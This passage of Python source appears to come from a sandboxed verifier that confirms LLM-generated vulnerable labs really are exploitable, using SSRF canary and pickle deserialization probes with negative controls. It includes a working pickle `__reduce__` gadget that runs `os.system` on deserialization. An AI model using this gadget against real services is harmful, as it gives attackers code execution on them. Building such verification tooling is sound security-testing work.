        await asyncio.to_thread(_spawn)
    except APIError as e:
        raise SandboxError(f"SSRF 캐너리 컨테이너 생성 실패: {e}") from e

    # The HTTP server starts within ~1s on python:alpine; the lab's first
    # SSRF request typically happens after probe payload send anyway, so
    # this short wait covers both image-cached cold-start and a warm-pull
    # case where docker run returns before the entrypoint binds the port.
    await asyncio.sleep(1.5)
    try:
        yield name
    finally:
        try:
            await asyncio.to_thread(_kill)
        except Exception:  # noqa: BLE001 — cleanup is best-effort
            log.warning("ssrf_canary.cleanup_failed", name=name)


class SsrfCanaryProbe(BackendProbe):
    """SSRF — force the lab to fetch a backend-controlled URL on the
    sandbox network and verify the canary saw the request.

    Why this stays honest: the canary's hostname is generated per-probe
    and never reachable from outside ``kestrel_sandbox_net``. The unique
    path token is constructed by the backend and never appears in the
    LLM's spec — a fake echo lab that just reflects the URL into its
    response cannot "fake" a hit because the hit is read from the
    canary's filesystem, not from the lab's response body.

    Negative control: a second request asks the lab to fetch a literal
    ``http://nonexistent-NONCE.invalid/`` URL. If the lab is genuinely
    fetching, no hit appears in the canary log; if the lab pings the
    canary regardless of input, the negative-token request also produces
    a canary hit and we reject as "always pings canary" pathology.
    """

    name = "ssrf_inbound_canary"
    applies_to = (
        "ssrf", "server-side-request-forgery", "url-fetch", "remote-fetch",
        "url-include", "outbound-fetch",
    )

    async def run(self, *, handle: LaunchedLab, ip: InjectionPoint) -> ProbeOutcome:
        try:
            async with _ssrf_canary() as canary_name:
                pos_token = _token("ssrf_pos")
                neg_token = _token("ssrf_neg")

                pos_url = f"http://{canary_name}/{pos_token}"
                neg_url = f"http://nonexistent-{neg_token}.invalid/{neg_token}"

                # Fire negative control FIRST so a hit-on-negative is
                # observable before the positive request muddies the log.
                try:
                    await _send(handle, ip, neg_url)
                except SandboxError:
                    pass  # benign — only the canary side-channel matters

                # Brief settle — apps that fetch URLs in a worker thread
                # may not finish by the time we check the log.
                await asyncio.sleep(0.5)

                code_neg, out_neg = await exec_in_lab(
                    canary_name,
                    ["sh", "-c", "cat /tmp/hits.log 2>/dev/null; true"],
                    timeout_seconds=5.0,
                )
                neg_log = out_neg.decode("utf-8", errors="replace")
                if pos_token in neg_log or neg_token in neg_log:
                    return ProbeOutcome(
                        name=self.name, kind="ssrf", passed=False,
                        rationale=(
                            "음성 대조 후 캐너리 로그에 토큰 흔적 — lab 이 입력 URL "
                            "을 무시하고 canary 를 무조건 호출하는 패턴."
                        ),
                        evidence={
                            "neg_url": neg_url,
                            "neg_log_head": _truncate(neg_log, 200),
                        },
                    )

                # Positive: send the canary URL with backend-chosen token.
                try:
                    pos_ex = await _send(handle, ip, pos_url)
                except SandboxError as e:
                    return ProbeOutcome(
                        name=self.name, kind="ssrf", passed=False,
                        rationale=f"SSRF 페이로드 송신 실패 ({e}).",
                        evidence={"pos_url": pos_url, "send_error": str(e)},
                    )

                await asyncio.sleep(0.5)

                code_pos, out_pos = await exec_in_lab(
                    canary_name,
                    ["sh", "-c", "cat /tmp/hits.log 2>/dev/null; true"],
                    timeout_seconds=5.0,
                )
                pos_log = out_pos.decode("utf-8", errors="replace")

                if pos_token not in pos_log:
                    return ProbeOutcome(
                        name=self.name, kind="ssrf", passed=False,
                        rationale=(
                            "SSRF URL 송신 후에도 캐너리 로그에 토큰이 없음 — "
                            "lab 이 URL 을 fetch 하지 않음 (출력에 URL 을 단순 echo "
                            "하거나 무시)."
                        ),
                        evidence={
                            "pos_url": pos_url,
                            "pos_status": pos_ex.get("status_code"),
                            "pos_body_head": _truncate(pos_ex.get("body") or "", 160),
                            "canary_log_head": _truncate(pos_log, 200),
                        },
                    )

                return ProbeOutcome(
                    name=self.name, kind="ssrf", passed=True,
                    rationale=(
                        f"backend SSRF canary '{canary_name}' 가 path='/{pos_token}' "
                        "로 inbound GET 을 받음 — lab 이 입력 URL 을 실제로 fetch 함."
                    ),
                    evidence={
                        "canary_name": canary_name,
                        "pos_token": pos_token,
                        "neg_token": neg_token,
                        "pos_status": pos_ex.get("status_code"),
                        "canary_log_head": _truncate(pos_log, 200),
                    },
                )
        except SandboxError as e:
            return ProbeOutcome(
                name=self.name, kind="ssrf", passed=False,
                rationale=f"SSRF 캐너리 인프라 오류 ({e}).",
                evidence={"infra_error": str(e)},
            )


# ---------------------------------------------------------------------------
# 9. Insecure deserialization probe — Python pickle gadget that writes canary
# ---------------------------------------------------------------------------


class _PickleCanary:
    """Pickle ``__reduce__`` gadget — on ``pickle.loads()`` the lab calls
    ``os.system(self._cmd)``. We construct the command from a backend
    canary path + value the LLM doesn't know, so a positive result is
    only possible via real deserialization."""

    def __init__(self, cmd: str) -> None:
        self._cmd = cmd

    def __reduce__(self):  # noqa: D401 — pickle protocol
        return (os.system, (self._cmd,))


def _pickle_canary_payload(cmd: str) -> str:
    """Base64-encoded pickle that runs *cmd* on deserialization. Most
    Python deserialization labs accept a base64 blob and decode-then-load."""
    return base64.b64encode(pickle.dumps(_PickleCanary(cmd))).decode("ascii")


class DeserializationCanaryProbe(BackendProbe):
    """Insecure deserialization (Python pickle). Detection is via
    side-channel: the pickle gadget writes a canary file inside the
    container, and we use ``exec_in_lab`` to read it back.

    Why this stays honest: the canary path is randomly chosen by the
    backend and never sent through the HTTP surface in plaintext — only
    embedded inside the binary pickle command string. The lab cannot
    pre-bake it. We also benchmark the canary against a benign payload
    first, so a lab that happens to write the same file regardless of
    input fails the negative control."""

    name = "deser_pickle_canary_write"
    applies_to = (
        "deserialization", "deser", "insecure-deserialization",
        "unsafe-deser", "pickle", "object-injection",
    )
    requires_exec = True

    async def run(self, *, handle: LaunchedLab, ip: InjectionPoint) -> ProbeOutcome:
        token = _token("deser")
        canary_path = f"/tmp/kestrel_canary_{token}"
        canary_value = f"KESTREL_DESER_OK_{token}"

        # Pre-flight: canary path must not exist yet (we'd otherwise
        # mistake stale state for code execution).
        try:
            code, _ = await exec_in_lab(
                handle.container_name,
                ["sh", "-c", f"test ! -e {shlex.quote(canary_path)}"],
            )
        except (SandboxError, asyncio.TimeoutError) as e:
            return ProbeOutcome(
                name=self.name, kind="deserialization", passed=False,
                rationale=f"pre-flight 카나리 부재 확인 실패 ({e}).",
                evidence={"canary_path": canary_path, "preflight_error": str(e)},
            )
        if code != 0:
            return ProbeOutcome(
                name=self.name, kind="deserialization", passed=False,
                rationale="canary path 가 이미 존재 — 검증 신뢰 불가.",
                evidence={"canary_path": canary_path},
            )

        # Negative control first: send benign string, ensure the canary
        # path stays empty afterwards. Catches "lab always writes canary
        # on any input" pathology.
        try:
            await _send(handle, ip, _benign_nonce(32))
        except SandboxError:
            pass  # benign request can fail; only the side-channel matters
        try:
            code_after_benign, out_after_benign = await exec_in_lab(
                handle.container_name,
                ["sh", "-c", f"cat {shlex.quote(canary_path)} 2>/dev/null; true"],
            )
        except (SandboxError, asyncio.TimeoutError) as e:
            return ProbeOutcome(
                name=self.name, kind="deserialization", passed=False,
                rationale=f"음성 대조 후 canary 확인 실패 ({e}).",
                evidence={"canary_path": canary_path, "neg_check_error": str(e)},
            )
        if code_after_benign == 0 and canary_value in out_after_benign.decode(errors="replace"):
            return ProbeOutcome(
                name=self.name, kind="deserialization", passed=False,
                rationale="benign 입력 직후 canary 가 이미 등장 — lab 이 입력과 무관하게 canary 를 만든다.",
                evidence={"canary_path": canary_path, "canary_after_benign": True},
            )

        # Positive: pickle gadget that runs `printf %s VALUE > PATH`.
        cmd = f"printf %s {shlex.quote(canary_value)} > {shlex.quote(canary_path)}"
        b64 = _pickle_canary_payload(cmd)
        try:
            ex = await _send(handle, ip, b64)
        except SandboxError as e:
            return ProbeOutcome(
                name=self.name, kind="deserialization", passed=False,
                rationale=f"pickle 페이로드 송신 실패 ({e}).",
                evidence={"send_error": str(e)},
            )

        # Allow brief settle time — some apps deserialize on a worker
        # thread and the file write may not be observable on the immediate
        # next exec call.
        await asyncio.sleep(0.2)

        try:
            code_after, out_after = await exec_in_lab(
                handle.container_name,
                ["sh", "-c", f"cat {shlex.quote(canary_path)} 2>/dev/null; true"],
            )
        except (SandboxError, asyncio.TimeoutError) as e:
            return ProbeOutcome(
                name=self.name, kind="deserialization", passed=False,
                rationale=f"pickle 송신 후 canary 확인 실패 ({e}).",
                evidence={"check_error": str(e)},
            )
        body_head = _truncate(ex.get("body") or "", 120)
        if code_after != 0 or canary_value not in out_after.decode(errors="replace"):
            return ProbeOutcome(
                name=self.name, kind="deserialization", passed=False,
                rationale=(
                    "pickle 페이로드 후에도 canary 파일이 생성되지 않음 — "
                    "deserialization 으로 인한 코드 실행 증거 없음 "
                    "(Python 이 아닌 lab 이거나, base64 디코딩/pickle.loads 호출 경로가 없음)."
                ),
                evidence={
                    "canary_path": canary_path,
                    "send_status": ex.get("status_code"),
                    "send_body_head": body_head,
                    "post_canary_exit_code": code_after,
                },
            )

        return ProbeOutcome(
            name=self.name, kind="deserialization", passed=True,
            rationale=(
                f"pickle __reduce__ 가스로 canary 파일 '{canary_path}' 가 생성되고 "
                f"backend-chosen value '{canary_value}' 가 정확히 기록됨 — "
                "역직렬화 → os.system 코드 실행 확인."
            ),
            evidence={
                "canary_path": canary_path,
                "canary_value": canary_value,
                "send_status": ex.get("status_code"),
                "send_body_head": body_head,
            },
        )


# ---------------------------------------------------------------------------
# Probe registry + dispatch
# ---------------------------------------------------------------------------


_PROBE_CLASSES: tuple[type[BackendProbe], ...] = (
    RceCanaryProbe,
    PathTraversalCanaryProbe,
    SstiArithmeticProbe,
    XssReflectProbe,
    SqliTimeBlindProbe,
    XxeCanaryProbe,
    OpenRedirectProbe,
    SsrfCanaryProbe,
    DeserializationCanaryProbe,
)


def select_probes(response_kind: str) -> list[BackendProbe]:
    """Pick probe instances applicable to the LLM-declared response_kind.

    We instantiate per call so probe state (canary tokens, attempt logs)
    stays scoped to one verification.
    """
    return [p() for p in _PROBE_CLASSES if p().applies(response_kind)]


def known_kinds() -> Iterable[str]:
    """For prompt nudging — every alias the registry currently handles."""
    seen: set[str] = set()
    for p in _PROBE_CLASSES:
        for a in p.applies_to:
            if a not in seen:
                seen.add(a)
                yield a


# ---------------------------------------------------------------------------
# Verdict aggregation
# ---------------------------------------------------------------------------


def build_verdict(
    response_kind: str,
    probe_results: list[ProbeOutcome],
    *,
    fallback_passed: bool | None = None,
) -> VerificationVerdict:
    """Combine per-probe outcomes into a final verdict.

    Pass policy:
      * If any backend probe ran AND at least one passed → accept,
        ``method=backend_probe``.
      * If a backend probe ran AND none passed → reject. The legacy LLM
        check does NOT rescue a failed backend probe — that would defeat
        the whole point of PR 9-L.
      * If no backend probe applied (unrecognised response_kind) →
        ``fallback_passed`` (the legacy LLM-indicator result) becomes the
        verdict, ``method=llm_indicator_only`` and a warning is logged.
    """
    if probe_results:
        any_pass = any(r.passed for r in probe_results)
        if any_pass:
            return VerificationVerdict(passed=True, method="backend_probe", probe_results=probe_results)
        reasons = "; ".join(r.rationale for r in probe_results if not r.passed) or "모든 probe 실패"
        return VerificationVerdict(
            passed=False,
            method="rejected",
            rejection_reason=reasons,
            probe_results=probe_results,
        )

    # No backend probe applies — fall back to legacy check.
    if fallback_passed is None:
        return VerificationVerdict(
            passed=False,
            method="rejected",
            rejection_reason=f"response_kind '{response_kind}' 에 대한 backend probe 가 없고 legacy 검증 결과도 없음.",
        )
    log.warning(
        "synthesizer_probes.fallback_to_llm_indicator",
        response_kind=response_kind,
        fallback_passed=fallback_passed,
    )
    return VerificationVerdict(
        passed=fallback_passed,
        method="llm_indicator_only" if fallback_passed else "rejected",
        rejection_reason=None if fallback_passed else "legacy LLM-indicator 검증도 실패.",
    )
